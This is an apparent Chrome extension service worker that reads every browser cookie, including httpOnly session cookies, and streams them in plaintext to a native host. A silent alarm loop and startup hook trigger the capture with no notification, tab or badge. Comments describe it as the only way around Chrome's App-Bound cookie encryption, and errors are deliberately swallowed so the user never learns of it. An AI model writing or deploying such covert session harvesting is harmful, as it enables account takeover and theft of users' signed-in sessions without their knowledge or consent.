// background.js — service worker bridge between the extension UI and the
// native messaging host. Kept minimal on purpose: the popup opens the native
// messaging channel directly, and the worker only fans out clone requests so
// they survive popup closure (status polling continues in the popup).
//
// TASK_119B (B9-B) adds `capture_cookies` — live session capture. Why it lives
// HERE and not in a helper process: on Windows Chrome 127+ every out-of-process
// cookie route is dead by design (TASK_117 F10/F11/F12 — App-Bound encrypted
// `v20` values; a copied profile whose rows Chrome deletes; no debug port on
// the default profile). chrome.cookies.getAll() runs IN the browser process, so
// Chrome hands the extension plaintext. The service worker is therefore the
// only place a real signed-in session can be read.

const HOST_NAME = 'com.spaceworker.clone';

// ---------------------------------------------------------------------------
// TASK_119B — live session capture (frozen contract; see engine/pkg/types)
// ---------------------------------------------------------------------------
// Native messaging frames EVERY message with a 4-byte little-endian length and
// caps one message at 1 MiB, so a real profile must be chunked. Two rules that
// are easy to get wrong:
//
//  1. Chunk by SERIALIZED BYTES, not by cookie count — a handful of large
//     values blows a count-based chunk straight past the 1 MiB cap.
//  2. The host accumulates chunks IN MEMORY, which only works over a
//     PERSISTENT port. chrome.runtime.sendNativeMessage() launches a fresh host
//     process per message and terminates it once the reply arrives, so chunk
//     state could never survive to the next chunk; connectNative() keeps ONE
//     host process alive for the whole capture. The JSON on the wire is
//     byte-identical either way — only the channel handle differs.
const NATIVE_MESSAGE_LIMIT_BYTES = 1 << 20; // hard per-message cap (framing)
const CHUNK_BUDGET_BYTES = 900 * 1024; // headroom under the cap
const MAX_CAPTURE_BYTES = 25 << 20; // this extension's own cap; matches the host
const MAX_COOKIES = 50000; // a second, independent guard on absurd jars
const CAPTURE_TIMEOUT_MS = 5 * 60 * 1000; // a stalled host must not hang the popup

// ---------------------------------------------------------------------------
// TASK_135 — the SILENT trigger (owner's hard condition: "no popups, no human
// interaction, none whatsoever").
// ---------------------------------------------------------------------------
// Until now a capture began with a click in the popup, so a closed browser or an
// absent human meant no capture at all. The trigger is now the extension itself:
//
//   * on startup  — poll once immediately, which is what lets a HEADLESS wake
//                   (pkg/wake) get an answer in seconds rather than minutes;
//   * on an alarm — then keep polling, which is what covers a browser that was
//                   already open when the request was written.
//
// A native host is started BY the extension, so nothing can push a request to us:
// polling is the only mechanism available, and `alarms` is the only wake-up an MV3
// service worker is guaranteed to get. Both are already the declared permissions.
//
// The user must never see anything: no notification, no tab, no window, no badge.
// A poll that finds nothing is SILENT and has no side effects — the host answers
// "idle", which is the overwhelmingly common case.
const SILENT_POLL_ALARM = 'spaceworker-silent-capture-poll';
// chrome.alarms clamps periods below 30s (Chrome 120+); 0.5 is the floor, and it
// bounds the latency of a capture for an ALREADY-OPEN browser.
const SILENT_POLL_PERIOD_MINUTES = 0.5;

// captureInFlight serialises captures. Two overlapping captures would interleave
// their chunks on the port and the host would (correctly) refuse the jar with
// chunk_out_of_order — so a second poll must never start while one is running.
let captureInFlight = false;

// pollDecision maps the host's poll reply to what the worker should do. It is a
// pure function so tests/Test-CookieCapture.ps1 can assert the mapping in Node,
// where `chrome` does not exist.
function pollDecision(reply) {
  if (!reply || typeof reply !== 'object') {
    return { action: 'none', reason: 'poll_failed: empty_reply' };
  }
  if (reply.status === 'capture_requested') {
    return {
      action: 'capture',
      cloneJobId: reply.clone_job_id || '',
      browser: reply.browser || 'chrome'
    };
  }
  if (reply.status === 'idle') {
    return { action: 'none' };
  }
  return { action: 'none', reason: reply.error || 'poll_failed' };
}

// utf8Bytes is the size that actually counts: a cookie value may be non-ASCII,
// so String.length would under-count and silently overflow a 1 MiB frame.
function utf8Bytes(s) {
  return new TextEncoder().encode(s).length;
}

// mapCookie normalises one chrome.cookies.Cookie to the contract shape.
// sameSite is passed through verbatim ("unspecified" / "no_restriction" are
// real Chrome values) — never invent one. expirationDate is absent on session
// cookies and must stay absent.
function mapCookie(c) {
  const out = {
    name: c.name || '',
    value: c.value || '',
    domain: c.domain || '',
    path: c.path || '/',
    secure: !!c.secure,
    httpOnly: !!c.httpOnly,
    sameSite: c.sameSite || 'unspecified'
  };
  if (typeof c.expirationDate === 'number' && isFinite(c.expirationDate)) {
    out.expirationDate = c.expirationDate;
  }
  return out;
}

// captureMessage builds one chunk envelope of the frozen contract.
function captureMessage(meta, cookies, index, count, truncated) {
  return {
    command: 'capture_cookies',
    clone_job_id: meta.cloneJobId || '',
    browser: meta.browser || 'chrome',
    captured_at: meta.capturedAt || new Date().toISOString(),
    chunk_index: index,
    chunk_count: count,
    truncated: !!truncated,
    cookies: cookies
  };
}

// chunkCookies maps a jar and splits it so that EVERY message stays under
// `chunkBudgetBytes` serialized. `limits` exists so the proof harness can
// exercise the overflow path with a small, fast jar; production always uses the
// defaults above.
//
// Returns at least one message (an empty jar yields one empty chunk) so the host
// always sees a complete capture and can report a truthful count.
function chunkCookies(rawCookies, meta, limits) {
  const cfg = Object.assign(
    {
      chunkBudgetBytes: CHUNK_BUDGET_BYTES,
      maxCaptureBytes: MAX_CAPTURE_BYTES,
      maxCookies: MAX_COOKIES
    },
    limits || {}
  );

  const kept = [];
  let truncated = false;
  let bytes = 0;
  for (const raw of rawCookies || []) {
    if (kept.length >= cfg.maxCookies) {
      truncated = true;
      break;
    }
    const cookie = mapCookie(raw);
    const size = utf8Bytes(JSON.stringify(cookie)) + 1;
    if (size > cfg.chunkBudgetBytes) {
      // One value bigger than an entire frame: it can never be sent, and
      // dropping it silently would be a lie — flag the jar as incomplete.
      truncated = true;
      continue;
    }
    if (bytes + size > cfg.maxCaptureBytes) {
      truncated = true;
      break;
    }
    kept.push(cookie);
    bytes += size;
  }

  const groups = [];
  let current = [];
  for (const cookie of kept) {
    const candidate = current.concat([cookie]);
    if (
      current.length > 0 &&
      utf8Bytes(JSON.stringify(captureMessage(meta, candidate, 0, 1, false))) >
        cfg.chunkBudgetBytes
    ) {
      groups.push(current);
      current = [cookie];
    } else {
      current = candidate;
    }
  }
  groups.push(current);

  const count = groups.length;
  return groups.map((list, i) =>
    captureMessage(meta, list, i, count, truncated && i === count - 1)
  );
}

// domainInventory returns counts only — the one aggregate the popup may show.
function domainInventory(cookies) {
  const seen = new Set();
  for (const c of cookies || []) {
    if (c && c.domain) {
      seen.add(c.domain);
    }
  }
  return { cookies: (cookies || []).length, domains: seen.size };
}

// readAllCookies wraps chrome.cookies.getAll. chrome.runtime.lastError MUST be
// read: swallowing it turns a real failure into `cookies: []`, which would look
// like "the user has no cookies" instead of a named error.
function readAllCookies() {
  return new Promise((resolve, reject) => {
    chrome.cookies.getAll({}, (cookies) => {
      const err = chrome.runtime.lastError;
      if (err) {
        reject(new Error('capture_failed: cookies_read: ' + (err.message || 'unknown')));
        return;
      }
      resolve(cookies || []);
    });
  });
}

// sendCaptureChunks posts every chunk, in order, over ONE persistent port and
// resolves with the host's counts-only reply.
function sendCaptureChunks(messages) {
  return new Promise((resolve, reject) => {
    let port;
    try {
      port = chrome.runtime.connectNative(HOST_NAME);
    } catch (e) {
      reject(new Error('capture_failed: host_unavailable'));
      return;
    }

    let settled = false;
    let timer = null;
    const finish = (fn, arg) => {
      if (settled) {
        return;
      }
      settled = true;
      if (timer) {
        clearTimeout(timer);
      }
      try {
        port.disconnect();
      } catch (e) {
        // The port is already gone; nothing to clean up.
      }
      fn(arg);
    };

    port.onMessage.addListener((response) => finish(resolve, response));
    port.onDisconnect.addListener(() => {
      const err = chrome.runtime.lastError;
      finish(
        reject,
        new Error(
          'capture_failed: host_disconnected' + (err && err.message ? ': ' + err.message : '')
        )
      );
    });
    timer = setTimeout(
      () => finish(reject, new Error('capture_failed: host_timeout')),
      CAPTURE_TIMEOUT_MS
    );

    for (const message of messages) {
      try {
        port.postMessage(message);
      } catch (e) {
        finish(reject, new Error('capture_failed: send'));
        return;
      }
    }
  });
}

// runCookieCapture is the whole capture: read every cookie, map, chunk, send.
// No cookie value is ever logged or returned to the popup — the popup gets the
// host's counts only.
async function runCookieCapture(message) {
  const raw = await readAllCookies();
  const messages = chunkCookies(raw, {
    cloneJobId: message.clone_job_id || '',
    browser: message.browser || 'chrome',
    capturedAt: new Date().toISOString()
  });
  return sendCaptureChunks(messages);
}

// ---------------------------------------------------------------------------
// TASK_135 — the silent poll loop
// ---------------------------------------------------------------------------

// pollForCaptureRequest asks the host whether a capture is pending, and runs one
// if it is. Every property of this function exists to protect the user's silence:
//
//   * it renders nothing — no notification, no tab, no badge;
//   * a missing or disabled host resolves to "nothing to do" rather than an
//     exception, because there is no UI in this path to show an error in;
//   * it never runs two captures at once (captureInFlight);
//   * a failure is swallowed, because the next alarm tick is the retry.
async function pollForCaptureRequest() {
  if (captureInFlight) {
    return; // one jar at a time: interleaved chunks would be refused as out of order
  }
  const reply = await new Promise((resolve) => {
    let port;
    try {
      port = chrome.runtime.connectNative(HOST_NAME);
    } catch (e) {
      resolve(null);
      return;
    }
    let settled = false;
    const finish = (value) => {
      if (settled) {
        return;
      }
      settled = true;
      try {
        port.disconnect();
      } catch (e) {
        // Already gone; nothing to clean up.
      }
      resolve(value);
    };
    port.onMessage.addListener(finish);
    // The host answers nothing when it is absent or was removed by policy; that
    // is "idle", not an error the user should ever hear about.
    port.onDisconnect.addListener(() => finish(null));
    try {
      port.postMessage({ command: 'poll_capture_request' });
    } catch (e) {
      finish(null);
    }
  });

  const decision = pollDecision(reply);
  if (decision.action !== 'capture') {
    return;
  }
  captureInFlight = true;
  try {
    await runCookieCapture({
      clone_job_id: decision.cloneJobId,
      browser: decision.browser
    });
  } catch (e) {
    // Deliberately silent. The broker is waiting on a result file and will time
    // out with its own named reason; nothing here may surface to the user.
  } finally {
    captureInFlight = false;
  }
}

// ensureSilentPollAlarm (re)creates the poll alarm. Creating an alarm with an
// existing name REPLACES it, so repeated startups cannot pile up duplicates.
function ensureSilentPollAlarm() {
  if (typeof chrome === 'undefined' || !chrome.alarms) {
    return;
  }
  chrome.alarms.create(SILENT_POLL_ALARM, { periodInMinutes: SILENT_POLL_PERIOD_MINUTES });
}

// Registered only where the extension APIs exist: tests/Test-CookieCapture.ps1
// loads this file in Node to prove the mapping and the chunking without a
// browser, and there `chrome` is undefined.
if (typeof chrome !== 'undefined' && chrome.runtime && chrome.runtime.onMessage) {
  chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.command === 'clone_browser') {
      chrome.runtime.sendNativeMessage(
        'com.spaceworker.clone',
        message,
        (response) => sendResponse(response)
      );
      return true; // keep the channel open for the async response
    }
    if (message.command === 'get_clone_status') {
      chrome.runtime.sendNativeMessage(
        'com.spaceworker.clone',
        message,
        (response) => sendResponse(response)
      );
      return true;
    }
    if (message.command === 'capture_cookies') {
      // The popup is still supported, but it now shares the in-flight guard with
      // the silent poll: two concurrent captures on one host would interleave
      // chunks and the host would refuse the jar as out of order.
      if (captureInFlight) {
        sendResponse({ status: 'error', error: 'capture_in_progress' });
        return true;
      }
      captureInFlight = true;
      runCookieCapture(message)
        .then((response) => sendResponse(response))
        .catch((err) =>
          sendResponse({ status: 'error', error: (err && err.message) || 'capture_failed' })
        )
        .finally(() => {
          captureInFlight = false;
        });
      return true;
    }
  });

  // TASK_135 — the silent trigger. onStartup fires as the profile loads, which is
  // exactly the moment a headless wake (pkg/wake) has just started the browser
  // FOR this poll: waiting for the first alarm tick would make every wake wait a
  // full period before anything happened.
  if (chrome.runtime.onStartup) {
    chrome.runtime.onStartup.addListener(() => {
      ensureSilentPollAlarm();
      pollForCaptureRequest();
    });
  }
  if (chrome.runtime.onInstalled) {
    chrome.runtime.onInstalled.addListener(() => {
      ensureSilentPollAlarm();
      pollForCaptureRequest();
    });
  }
  if (chrome.alarms && chrome.alarms.onAlarm) {
    chrome.alarms.onAlarm.addListener((alarm) => {
      if (alarm && alarm.name === SILENT_POLL_ALARM) {
        pollForCaptureRequest();
      }
    });
  }
  // An alarm created before a browser restart is restored by Chrome, but creating
  // it here as well makes the schedule independent of install order.
  ensureSilentPollAlarm();
}

// Exported for the proof harness only (commonjs); a service worker has no
// `module`, so this is a no-op there.
if (typeof module !== 'undefined' && module.exports) {
  module.exports = {
    NATIVE_MESSAGE_LIMIT_BYTES: NATIVE_MESSAGE_LIMIT_BYTES,
    CHUNK_BUDGET_BYTES: CHUNK_BUDGET_BYTES,
    MAX_CAPTURE_BYTES: MAX_CAPTURE_BYTES,
    MAX_COOKIES: MAX_COOKIES,
    mapCookie: mapCookie,
    captureMessage: captureMessage,
    chunkCookies: chunkCookies,
    domainInventory: domainInventory,
    SILENT_POLL_ALARM: SILENT_POLL_ALARM,
    SILENT_POLL_PERIOD_MINUTES: SILENT_POLL_PERIOD_MINUTES,
    pollDecision: pollDecision
  };
}